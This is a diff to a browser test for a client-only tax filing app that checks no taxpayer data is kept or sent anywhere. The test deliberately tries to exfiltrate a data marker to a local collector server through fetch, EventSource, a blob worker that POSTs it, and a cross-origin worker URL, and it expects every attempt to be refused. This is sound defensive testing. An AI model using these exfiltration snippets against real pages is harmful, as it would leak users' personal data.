@@ -25,20 +25,30 @@ import { startStagedSiteServer, type StagedSiteServer } from './stagedSiteServer
  * No-retention proof for the static client-only build, in a real browser (#132, #126).
  *
  * Runs the staged site (`npm run build:static && npm run stage:static`) in pinned headless Chromium, served locally
- * with the site's own `_headers` and `_redirects`, and drives the app the way a person would: start a return, type a
- * name, date of birth, address and phone number into the interview (autosave), import a golden end-to-end scenario
- * (synthetic data) save file carrying a TIN and a wage amount, open every income screen, save and read the wages
- * back, open review, and attempt PDF, sign, and submit. Every value typed or imported is a unique marker.
+ * with the site's own `_headers` and `_redirects`, and drives the app the way a person would: start a return, open
+ * About you from the checklist Start control, type a name, date of birth, address and phone number into the
+ * interview (autosave), import a golden end-to-end scenario (synthetic data) save file carrying a TIN and a wage
+ * amount, open every income screen, save and read the wages back, open review, and attempt PDF, sign, and submit.
+ * Every value typed or imported is a unique marker.
+ *
+ * An unanswered Schedule B (Form 1040) Part III refuses a later print (`/flowPrintRefuseScheduleBPartIII`) and does
+ * not make `/flowIsKnockedOut` true, so the checklist still offers Start. Instructions for Schedule B (2025) p. 1
+ * require the schedule only when taxable interest or ordinary dividends are over $1,500; pp. 2–3 (FinCEN Form 114,
+ * 31 U.S.C. 5314; Form 8938, 26 U.S.C. 6038D; Form 3520, 26 U.S.C. 6048) are the "Yes" answers that knock the
+ * return out.
  *
  * Asserted for the whole session, across every page, worker and service worker in the browser context:
- * - every request is a same-origin GET for a static asset, with no body and no query string;
+ * - every request is a same-origin GET for a static asset, with no body and no query string, and the bytes the
+ *   local server received are the same requests (method and path) the browser recorded, including headers;
  * - no request to the `.invalid` API origin or any other origin; nothing reaches a second local "collector" server,
  *   even when the page deliberately tries fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, a
- *   cross-origin image and a form post to it; no WebSocket is opened to any host;
+ *   cross-origin image, a form post, a blob worker, or a cross-origin worker script; no WebSocket is opened to any
+ *   host;
  * - no request URL, header or body contains a marker: plain, JSON-escaped, URL-encoded, UTF-16, base64 or
- *   base64url, and the TIN even when split into its parts (the search itself is tested first);
- * - the CSP is sent as a response header with connect-src, form-action and frame-ancestors 'none' and no unsafe-*
- *   script source;
+ *   base64url, and the TIN even when split into its parts (the search itself is tested first); no request carries
+ *   a cookie;
+ * - the CSP is sent as a response header with connect-src, form-action and frame-ancestors 'none', worker-src
+ *   'self', and script-src 'self' (no unsafe-*);
  * - after switching to Español, after the session and again after a reload, localStorage, sessionStorage,
  *   IndexedDB, Cache Storage, the origin private file system, cookies and service-worker registrations are empty,
  *   and after the reload the return is gone;
@@ -47,8 +57,9 @@ import { startStagedSiteServer, type StagedSiteServer } from './stagedSiteServer
  *   ciphertext that opens with the passphrase only; no marker or passphrase is in it; "Clear all data on this
  *   device" removes it, and nothing comes back after a reload.
  *
- * Chromium is the revision pinned by the playwright devDependency (`launchPinnedChromium`). Nothing outside 127.0.0.1
- * is contacted: requests to any other host are aborted and fail the test.
+ * Chromium is the revision pinned by the playwright devDependency (`launchPinnedChromium` checks `browser.version()`
+ * against playwright-core `browsers.json`). Nothing outside 127.0.0.1 is contacted: requests to any other host are
+ * aborted and fail the test.
  */
 
 const flow = createFlowConfig(flowNodes);
@@ -403,6 +414,7 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     context.on(`page`, (p) => p.on(`websocket`, (ws) => webSockets.push(`opened ${ws.url()}`)));
     const page = await context.newPage();
     page.setDefaultTimeout(20_000);
+    const requestMark = site.requests.length;
     const recorded = () =>
       Promise.all(
         requests.map(
@@ -416,7 +428,7 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
           })
         )
       );
-    return { context, page, recorded, aborted, webSockets };
+    return { context, page, recorded, aborted, webSockets, requestMark };
   }
 
   const snapshotStorage = async (context: BrowserContext, page: Page) => {
@@ -460,7 +472,12 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
    * `deliberate` are the exfiltration attempts made on purpose; each must have been refused by the browser itself
    * (CSP), so it never reached the network. Every other request must be a plain same-origin asset GET.
    */
-  async function assertNetwork(recorded: () => Promise<Recorded[]>, aborted: string[], webSockets: string[]) {
+  async function assertNetwork(
+    recorded: () => Promise<Recorded[]>,
+    aborted: string[],
+    webSockets: string[],
+    requestMark: number
+  ) {
     const all = await recorded();
     expect(all.length).toBeGreaterThan(0);
     // blob: URLs are the in-page save file downloads; they never leave the browser.
@@ -476,6 +493,15 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     expect(sent.filter((r) => r.method !== `GET`).map((r) => `${r.method} ${r.url}`)).toEqual([]);
     expect(sent.filter((r) => r.body !== null).map((r) => r.url)).toEqual([]);
     expect(sent.filter((r) => new URL(r.url).search !== ``).map((r) => r.url)).toEqual([]);
+    const cookieHeader = (headers: string) => {
+      try {
+        const parsed = JSON.parse(headers) as Record<string, string>;
+        return Object.entries(parsed).some(([name, value]) => name.toLowerCase() === `cookie` && value !== ``);
+      } catch {
+        return /^cookie:/im.test(headers);
+      }
+    };
+    expect(sent.filter((r) => cookieHeader(r.headers)).map((r) => r.url)).toEqual([]);
     // Anything but a page load must be a file of the staged site (no made-up path can carry data).
     const notStaged = sent.filter((r) => {
       if (r.resourceType === `document`) return false;
@@ -488,7 +514,24 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     );
     expect(leaks).toEqual([]);
     expect(collector.hits).toEqual([]);
-    expect(site.requests.filter((r) => r.method !== `GET` || r.body !== ``)).toEqual([]);
+
+    // What this process actually received during the scenario, not only what Playwright observed.
+    const served = site.requests.slice(requestMark);
+    const requestKey = (method: string, rawUrl: string, base: string) => {
+      const url = new URL(rawUrl, base);
+      return `${method} ${decodeURIComponent(url.pathname)}${url.search}`;
+    };
+    expect(served.map((r) => requestKey(r.method, r.url, site.origin)).sort()).toEqual(
+      sent.map((r) => requestKey(r.method, r.url, site.origin)).sort()
+    );
+    expect(served.filter((r) => r.method !== `GET` || r.body !== ``).map((r) => `${r.method} ${r.url}`)).toEqual([]);
+    expect(served.filter((r) => new URL(r.url, site.origin).search !== ``).map((r) => r.url)).toEqual([]);
+    expect(served.filter((r) => r.url.includes(`.invalid`)).map((r) => r.url)).toEqual([]);
+    expect(served.filter((r) => /^cookie:/im.test(r.headers)).map((r) => r.url)).toEqual([]);
+    const servedLeaks = served.flatMap((r) =>
+      findMarkers(`${r.url}\n${r.headers}\n${r.body}`).map((m) => `${m} in ${r.method} ${r.url}`)
+    );
+    expect(servedLeaks).toEqual([]);
   }
 
   const startReturn = async (page: Page) => {
@@ -575,7 +618,7 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
   });
 
   it(`keeps nothing after the session or a reload, and sends nothing`, async () => {
-    const { context, page, recorded, aborted, webSockets } = await newSession();
+    const { context, page, recorded, aborted, webSockets, requestMark } = await newSession();
     const home = await page.goto(`${site.origin}/df/file/home`);
 
     // The CSP is enforced from the response header, not only the <meta> tag.
@@ -588,16 +631,22 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     expect(directive(`connect-src`)).toBe(`connect-src 'none'`);
     expect(directive(`form-action`)).toBe(`form-action 'none'`);
     expect(directive(`frame-ancestors`)).toBe(`frame-ancestors 'none'`);
-    expect(directive(`script-src`)).toBeTruthy();
+    expect(directive(`worker-src`)).toBe(`worker-src 'self'`);
+    expect(directive(`script-src`)).toBe(`script-src 'self'`);
     expect(directive(`script-src`)).not.toContain(`unsafe-`);
 
     // Interview: name, date of birth, address and phone, each saved with "Save and continue" (autosave).
-    // A fresh return has /flowIsKnockedOut set (/flowKnockoutScheduleBPartIII is true until Part III is
-    // answered), so the checklist does not show Start. The about-you screens are still available.
+    // Schedule B Part III is unanswered, so the print would be refused, but the checklist still offers Start.
     await startReturn(page);
-    await openInApp(page, `/df/file/flow/you-and-your-family/about-you/about-you-intro`);
-    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
-    await page.waitForURL(/\/about-you-basic-info/);
+    const start = page.getByTestId(`heading-button-link`).first();
+    await start.waitFor();
+    expect((await start.innerText()).replace(/\s+/g, ` `).trim()).toBe(`Start`);
+    await start.click();
+    await page.waitForURL(/\/about-you/);
+    if (!/\/about-you-basic-info/.test(new URL(page.url()).pathname)) {
+      await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
+      await page.waitForURL(/\/about-you-basic-info/);
+    }
     await page.locator(`input[id$="/firstName"]`).fill(UI.firstName);
     await page.locator(`input[id$="/lastName"]`).fill(UI.lastName);
     await page.locator(`#month`).fill(`04`);
@@ -793,6 +842,30 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
           eventSource: await outcome(() => new EventSource(`${target}/sse?m=${marker}`)),
           img,
           form,
+          workerBlob: await new Promise<string>((resolve) => {
+            let settled = false;
+            const finish = (value: string) => {
+              if (!settled) {
+                settled = true;
+                resolve(value);
+              }
+            };
+            document.addEventListener(`securitypolicyviolation`, (event) => {
+              const directive = event.violatedDirective || event.effectiveDirective;
+              if (directive.startsWith(`worker-src`)) finish(`refused`);
+            });
+            try {
+              const source = `fetch(${JSON.stringify(`${target}/worker`)}, { method: 'POST', body: ${JSON.stringify(
+                marker
+              )} })`;
+              const worker = new Worker(URL.createObjectURL(new Blob([source], { type: `text/javascript` })));
+              worker.addEventListener(`error`, () => finish(`refused`));
+            } catch {
+              finish(`refused`);
+            }
+            setTimeout(() => finish(`no violation reported`), 3000);
+          }),
+          workerUrl: await outcome(() => new Worker(`${target}/worker.js?m=${encodeURIComponent(marker)}`)),
         };
       },
       { target: collector.origin, marker: FILE.lastName }
@@ -805,6 +878,8 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
       eventSource: `refused`,
       img: `refused`,
       form: `refused`,
+      workerBlob: `refused`,
+      workerUrl: `refused`,
     });
 
     // Switching to Español (and back) changes the page language but stores nothing.
@@ -824,12 +899,12 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     expect(findMarkers(await page.content())).toEqual([]);
     expect(await snapshotStorage(context, page)).toEqual(EMPTY);
 
-    await assertNetwork(recorded, aborted, webSockets);
+    await assertNetwork(recorded, aborted, webSockets, requestMark);
     await context.close();
   }, 600_000);
 
   it(`writes only an encrypted copy on an explicit save, and "Clear all data" removes it`, async () => {
-    const { context, page, recorded, aborted, webSockets } = await newSession();
+    const { context, page, recorded, aborted, webSockets, requestMark } = await newSession();
     await page.goto(`${site.origin}/df/file/home`);
     await startReturn(page);
     await openDeviceData(page);
@@ -871,7 +946,7 @@ describe(`static client: no taxpayer data is kept in the browser or sent anywher
     await page.goto(`${site.origin}/df/file/home`);
     expect(await snapshotStorage(context, page)).toEqual(EMPTY);
 
-    await assertNetwork(recorded, aborted, webSockets);
+    await assertNetwork(recorded, aborted, webSockets, requestMark);
     await context.close();
   }, 180_000);
 });
